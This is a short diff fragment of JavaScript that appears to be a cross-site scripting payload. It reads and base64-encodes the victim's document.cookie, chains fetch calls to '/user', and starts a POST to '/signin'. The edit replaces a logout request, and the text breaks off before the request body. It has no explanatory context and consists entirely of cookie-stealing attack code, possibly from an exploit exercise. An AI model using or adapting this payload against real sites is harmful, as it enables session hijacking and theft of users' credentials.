@@ -1,6 +1,6 @@
 fetch("/user").then(e=>{
  aaa=btoa(document.cookie);
-fetch("/user/logout").then(e=>{
+fetch("/user").then(e=>{
  fetch("/signin",{
     method: "POST",
     headers: {
